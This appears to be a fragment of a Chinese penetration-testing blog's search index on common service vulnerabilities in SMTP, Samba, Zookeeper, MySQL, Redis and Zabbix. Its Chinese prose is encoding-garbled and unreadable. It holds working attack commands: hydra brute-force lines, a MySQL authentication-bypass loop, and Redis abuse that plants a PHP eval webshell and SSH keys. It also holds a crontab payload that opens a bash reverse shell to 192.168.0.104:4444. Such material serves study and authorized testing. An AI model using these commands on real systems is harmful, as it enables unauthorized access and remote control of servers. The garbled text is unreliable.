TOï¼›å¸¸åœ¨ MAIL FROM å‘½ä»¤ä¹‹å VRFY ç”¨äºæŒ‡å®šç”¨æˆ·/é‚®ç®±æ˜¯å¦å­˜åœ¨ï¼›ç”±äºå®‰å…¨åŸå› ï¼ŒæœåŠ¡å™¨å¸¸ç¦æ­¢æ­¤å‘½ä»¤ EXPN éªŒè¯ç»™å®šçš„é‚®ç®±åˆ—è¡¨æ˜¯å¦å­˜åœ¨ï¼Œä¹Ÿå¸¸è¢«ç¦ç”¨ è¿”å›ç  250ï¼šè¦æ±‚é‚®ä»¶æ“ä½œå®Œæˆ 500ï¼šè¦æ±‚é‚®ä»¶æ“ä½œæœªå®Œæˆï¼Œé‚®ç®±ä¸å¯ç”¨ï¼ˆä¾‹å¦‚ï¼Œé‚®ç®±æœªæ‰¾åˆ°ï¼Œæˆ–ä¸å¯è®¿é—®ï¼‰ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Postfix ç®€ä»‹ postfix æ˜¯ ubuntu çš„é»˜è®¤é‚®ä»¶ä¼ è¾“ä»£ç†ï¼ˆMTAï¼‰ http://www.postfix.org ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SMTP ç”¨æˆ·æšä¸¾ Ubuntu ç³»ç»Ÿç”¨æˆ·å°±æ˜¯ postfix ç”¨æˆ· telnet Smtp-user-enum msf æ‰‹åŠ¨æšä¸¾ SMTP ç”¨æˆ· telnet VERY ftp MAIL FROM:ftp + RCPT TO:ftp SMTP-user-enum apt-get install smtp-user-enum smtp-user-enum -M VRFY -u root -t 202.38.xxx.xxx smtp-user-enum -M VRFY -U dic.txt -t 202.38.xxx.xxx smtp-user-enum -M RCPT -u bin -t 202.38.xxx.xxx smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx msf auxiliary/scanner/smtp/smtp_enum ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:4","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æš´åŠ›ç ´è§£ hydra hydra -l msfadmin -P passwd.txt smtp://IP ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:5","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Samba æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Samba ç®€ä»‹ Samba æ˜¯åœ¨ Linux å’Œ UNIX ç³»ç»Ÿä¸Šå®ç° SMB åè®®çš„ä¸€ä¸ªå…è´¹è½¯ä»¶ï¼Œç”±æœåŠ¡å™¨åŠå®¢æˆ·ç«¯ç¨‹åºæ„æˆã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SMB ç®€ä»‹ SMB(Server Messages Blockï¼Œä¿¡æ¯æœåŠ¡å—)æ˜¯ä¸€ç§åœ¨å±€åŸŸç½‘ä¸Šå…±äº«æ–‡ä»¶å’Œæ‰“å°æœºçš„ä¸€ç§é€šä¿¡åè®®ï¼Œå®ƒä¸ºå±€åŸŸç½‘å†…çš„ä¸åŒè®¡ç®—æœºä¹‹é—´æä¾›æ–‡ä»¶åŠæ‰“å°æœºç­‰èµ„æºçš„å…±äº«æœåŠ¡ã€‚ SMBåè®®æ˜¯å®¢æˆ·æœº/æœåŠ¡å™¨å‹åè®®ï¼Œå®¢æˆ·æœºé€šè¿‡è¯¥åè®®å¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„å…±äº«æ–‡ä»¶ç³»ç»Ÿã€æ‰“å°æœºåŠå…¶ä»–èµ„æºã€‚é€šè¿‡è®¾ç½® NetBIOS over TCP/IP ä½¿å¾— Samba ä¸ä½†èƒ½ä¸å±€åŸŸç½‘ç»œä¸»æœºåˆ†äº«èµ„æºï¼Œè¿˜èƒ½ä¸å…¨ä¸–ç•Œçš„ç”µè„‘åˆ†äº«èµ„æºã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SMB ä¿¡æ¯æ³„éœ² msf auxiliary/scanner/smb/smb_version nmap nmap -sV -p 445 IP nmap -sV -v -p 445 --script=smb-vuln* nmblookup nmblookup ç”¨äºæŸ¥è¯¢ NetBIOS åç§°ï¼Œå¹¶ä½¿ç”¨åŸºäº TCP/IP çš„ NetBIOS æŸ¥è¯¢å°†å®ƒä»¬æ˜ å°„åˆ°ç½‘ç»œä¸­çš„ IP åœ°å€ã€‚è¿™äº›é€‰é¡¹å…è®¸å°†åç§°æŸ¥è¯¢å®šå‘åˆ°ç‰¹å®šçš„ IP å¹¿æ’­åŒºåŸŸæˆ–ç‰¹å®šçš„æœºå™¨ã€‚æ‰€æœ‰æŸ¥è¯¢éƒ½é€šè¿‡ UDP å®Œæˆã€‚ nmblookup æ˜¯ç”¨äºæšä¸¾åŸŸ/å·¥ä½œç«™å’Œ MAC åœ°å€çš„æœ‰ç”¨å‘½ä»¤ nmblookup -A 192.168.1.139 nbtscan æ‰«æåœ¨æœ¬åœ°æˆ–è¿œç¨‹ TCP/IP ç½‘ç»œä¸Š NetBIOS æ‰“å¼€çš„åç§°æœåŠ¡å™¨ï¼Œå› ä¸ºè¿™æ˜¯æŸ¥æ‰¾æ‰“å¼€å…±äº«çš„ç¬¬ä¸€æ­¥ å¯ä»¥åœ¨æ•´ä¸ªå­ç½‘ä¸­å·¥ä½œï¼Œè€Œä¸æ˜¯åœ¨å•ä¸ª IP ä¸Šå·¥ä½œ nbtscan 192.168.1.1/24 SMBMap SMBMap å…è®¸ç”¨æˆ·æšä¸¾æ•´ä¸ªåŸŸä¸­çš„ samba å…±äº«é©±åŠ¨å™¨ã€‚åˆ—å‡ºå…±äº«é©±åŠ¨å™¨ï¼Œé©±åŠ¨å™¨æƒé™ï¼Œå…±äº«å†…å®¹ï¼Œä¸Šè½½/ä¸‹è½½åŠŸèƒ½ï¼Œæ–‡ä»¶åè‡ªåŠ¨ä¸‹è½½æ¨¡å¼åŒ¹é…ï¼Œç”šè‡³æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚æ—¨åœ¨ç®€åŒ–å¤§å‹ç½‘ç»œä¸­æ½œåœ¨æ•æ„Ÿæ•°æ®çš„æœç´¢ã€‚ smbmap -H 192.168.1.139 smbmap -H 192.168.1.139 -u msfadmin -p msfadmin ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æš´åŠ›ç ´è§£ hydra hydra -L user.txt -P pass.txt -v smb://ip ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:4","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å‘½ä»¤æ‰§è¡Œ search smb 3.0.20 use exploit/multi/samba/usermap_script ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:5","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Zookeeper ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Zookeeper ç®€ä»‹ Zookeeper æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶ï¼Œæ˜¯ Apache Hadoop çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œå®ƒä¸»è¦æ˜¯ç”¨æ¥è§£å†³åˆ†å¸ƒå¼åº”ç”¨ä¸­ç»å¸¸é‡åˆ°çš„ä¸€äº›æ•°æ®ç®¡ç†é—®é¢˜ï¼Œå¦‚ï¼šç»Ÿä¸€å‘½åæœåŠ¡ã€çŠ¶æ€åŒæ­¥æœåŠ¡ã€é›†ç¾¤ç®¡ç†ã€åˆ†å¸ƒå¼åº”ç”¨é…ç½®é¡¹çš„ç®¡ç†ç­‰ã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ç¯å¢ƒæ­å»º wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz tar -xzvf zookeeper-3.4.14.tar.gz mv zoo_sample.cfg zoo.cfg ./zkServer.sh start ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æœªæˆæƒè®¿é—® Zookeeper é»˜è®¤æœªè®¾ç½®å¯†ç ï¼Œåœ¨æœªè¿›è¡Œä»»ä½•è®¿é—®æ§åˆ¶æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ‰§è¡Œ env å‘½ä»¤è·å¾—ç³»ç»Ÿå¤§é‡çš„æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ç³»ç»Ÿåç§°ã€Java ç¯å¢ƒã€‚ Zookeeper é»˜è®¤ç«¯å£å¼€å¯åœ¨ 2181 ç«¯å£ netstat -an | grep 2181 nmap -sV -p 2181 IP nc IP 2181 envi æ‰“å°æœ‰å…³æœåŠ¡ç¯å¢ƒçš„è¯¦ç»†ä¿¡æ¯ stat åˆ—å‡ºå…³äºæ€§èƒ½å’Œè¿æ¥å®¢æˆ·ç«¯çš„ç»Ÿè®¡ä¿¡æ¯ ruok æµ‹è¯•æœåŠ¡å™¨æ˜¯å¦è¿è¡Œåœ¨éé”™è¯¯çŠ¶æ€ reqs åˆ—å‡ºæœªå®Œæˆçš„è¯·æ±‚ dump åˆ—å‡ºæœªå®Œæˆçš„ä¼šè¯å’Œä¸´æ—¶èŠ‚ç‚¹ å›¾å½¢åŒ–ç•Œé¢å·¥å…·ï¼š ZooInspector ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Mysql æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Mysql ç®€ä»‹ Mysql æ•°æ®åº“æ˜¯ç›®å‰ä¸–ç•Œä¸Šä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„æ•°æ®åº“ä¹‹ä¸€ï¼Œå¾ˆå¤šè‘—åå…¬å¸å’Œç«™ç‚¹éƒ½ä½¿ç”¨Mysql ä½œä¸ºå…¶æ•°æ®åº“æ”¯æ’‘ ç›®å‰å¾ˆå¤šæ¶æ„éƒ½ä»¥ Mysql ä½œä¸ºæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œä¾‹å¦‚ LAMPã€å’Œ WAMP ç­‰ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Mysql ä¿¡æ¯æ”¶é›† ç‰ˆæœ¬ä¿¡æ¯ nmap: nmap -sV -p 3306 IP msf: use auxiliary/scanner/mysql/mysql_version å…¶å®ƒç›¸å…³ä¿¡æ¯ use auxiliary/admin/mysql/mysql_enum ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Mysql å¯†ç ç ´è§£ hydra hydra -L user.txt -P password.txt -v mysql://IP msf use auxiliary/scanner/mysql/mysql_login ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Mysql æ¼æ´åˆ©ç”¨ MySQL èº«ä»½è®¤è¯æ¼æ´(CVE-2012-2122) https://seclists.org/oss-sec/2012/q2/493 memcmp() çš„è¿”å›å€¼éƒ½åœ¨[127ï¼Œ-128]ä¹‹å†…ï¼ŒæŠŠä¸¤ä¸ªå­—ç¬¦ä¸²é€ä¸ªå­—ç¬¦çš„æ¯”è¾ƒï¼Œå¦‚æœæ‰¾åˆ°ä¸ä¸€æ ·çš„ï¼Œå°±æŠŠè¿™ä¸¤ä¸ªå­—ç¬¦ç›¸å‡åè¿”å› memcmp()è¿”å› 0 çš„æ—¶å€™ check_scramble() è®¤è¯é€šè¿‡ æ¼æ´åˆ©ç”¨ msfï¼š use auxiliary/scanner/mysql/mysql_authbypass_hashdump Linux shell: for i in `seq 1 1000`;do mysql -uroot -pwrong -h IP -P3306;done ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:4","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Redis ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"redis ç®€ä»‹ Redisæ˜¯å¤§å®¶å¸¸è¯´çš„éå…³ç³»å‹æ•°æ®åº“ä¸­çš„ä¸€ç§ï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ ANSI è¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œå¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Value æ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„API Redis ä¸ memcached ä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚ä½† Redis ä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº† master-slave (ä¸»ä»)åŒæ­¥ã€‚ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"redis æœªæˆæƒè®¿é—®æ¼æ´ é»˜è®¤çš„é…ç½®æ˜¯ä½¿ç”¨ 6379 ç«¯å£ï¼Œæ²¡æœ‰å¯†ç ã€‚è¿™æ—¶å€™ä¼šå¯¼è‡´æœªæˆæƒè®¿é—®è¯»å†™ Redis æ•°æ®ã€‚ åœ¨ web ç›®å½•ä¸‹å†™å…¥ Webshell config set dir /var/www/html config set dbfilename webshell.php set webshell \"\u003c?php phpinfo();?\u003e\" save å½“æ•°æ®åº“è¿‡å¤§æ—¶ï¼Œredis å†™ shell çš„å°æŠ€å·§ï¼š \u003c?php set_time_limit(0); $fp=fopen('webshell.php','w'); fwrite($fp,'\u003c?php @eval($_POST[1]);?\u003e'); exit(); ?\u003e å†™ ssh å…¬é’¥ ssh-keygen -t rsa cd .ssh (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") \u003e 1.txt cat 1.txt | redis-cli -h ip -x set payload config set dir /root/.ssh config set dbfilename authorized_keys save å†™ crontab redis-cli -h 192.168.0.104 set xxx \"\\n\\n*/1 * * * * /bin/bash -i\u003e\u0026/dev/tcp/192.168.0.104/4444 0\u003e\u00261\\n\\n\" config set dir /var/spool/cron config set dbfilename root save ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"åˆ©ç”¨ redis ä¸»ä»å¤åˆ¶ rce https://geekby.xyz/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Zabbix æ¼æ´ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:0","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Zabbix ç®€ä»‹ Zabbix æ˜¯ç”± Alexei Vladishev å¼€å‘çš„ä¸€ç§ç½‘ç»œç›‘è§†ã€ç®¡ç†ç³»ç»Ÿï¼ŒåŸºäº ServerClient æ¶æ„ã€‚å¯ç”¨äºç›‘è§†å„ç§ç½‘ç»œæœåŠ¡ã€æœåŠ¡å™¨å’Œç½‘ç»œæœºå™¨ç­‰çŠ¶æ€ã€‚ ä½¿ç”¨å„ç§ Database-end å¦‚ï¼šMySQLï¼ŒPostgreSQLï¼ŒSQLiteï¼ŒOracle IBM DB2 å‚¨å­˜èµ„æ–™ã€‚Server ç«¯åŸºäº C è¯­è¨€ã€Webç®¡ç†ç«¯ frontend åˆ™æ˜¯åŸºäº PHP æ‰€åˆ¶ä½œçš„ã€‚Zabbix å¯ä»¥ä½¿ç”¨å¤šç§æ–¹å¼ç›‘è§†ã€‚å¯ä»¥åªä½¿ç”¨ Simple Check ä¸éœ€è¦å®‰è£… client ç«¯ï¼Œäº¦å¯åŸºäº SMTP æˆ– HTTP å„ç§åå®šåšæ­»æ´»ç›‘è§†ã€‚ åœ¨å®¢æˆ·ç«¯å¦‚ UNIXï¼Œ Windows ä¸­å®‰è£… Zabbix Agent ä¹‹åï¼Œå¯ç›‘è§† CPU Loadã€ç½‘ç»œä½¿ç”¨çŠ¶å†µã€ç¡¬ç›˜å®¹é‡ç­‰å„ç§çŠ¶æ€ã€‚è€Œå°±ç®—æ²¡æœ‰å®‰è£… Agent åœ¨ç›‘è§†å¯¹è±¡ä¸­ï¼ŒZabbix ä¹Ÿå¯ä»¥ç»ç”± SNMPã€TCPã€IMPã€åˆ©ç”¨ PMIã€SSHã€ telnet å¯¹ç›®æ ‡è¿›è¡Œç›‘è§†ã€‚ å¦å¤–ï¼Œ Zabbix åŒ…å« XMPP ç­‰å„ç§ Item è­¦ç¤ºåŠŸèƒ½ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:1","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Zabbix SQL æ³¨å…¥æ¼æ´ https://geekby.xyz/2019/03/01/zabbix-latest.php-sql-zhu-ru-lou-dong/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:2","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Zabbix å‘½ä»¤æ‰§è¡Œåˆ©ç”¨ ç®¡ç†å‘˜åœ¨å®‰è£…é…ç½® Zabbix è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨äº†å¼±å£ä»¤æˆ–é»˜è®¤çš„ç”¨æˆ·åä¸å£ä»¤ã€‚å¦‚ï¼šAdmin/zabbixï¼Œè¿™æ ·ï¼ŒZabbixæœåŠ¡å™¨çš„ç”¨æˆ·è®¤è¯å°±å½¢åŒè™šè®¾ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»º system.run[command,] ç›‘æ§é¡¹æ‰§è¡Œå‘½ä»¤ï¼Œç”šè‡³è·å–æœåŠ¡å™¨ shellï¼Œè¿›è¡Œå„ç§æŒ–çŸ¿è¡Œä¸ºã€‚ https://www.jianshu.com/p/675b6385b7c0 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:3","tags":["æ¸—é€æµ‹è¯•","æœåŠ¡æ¼æ´"],"title":"å¸¸è§æœåŠ¡ç±»æ¼æ´","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Elasticsearch æ¼æ´ 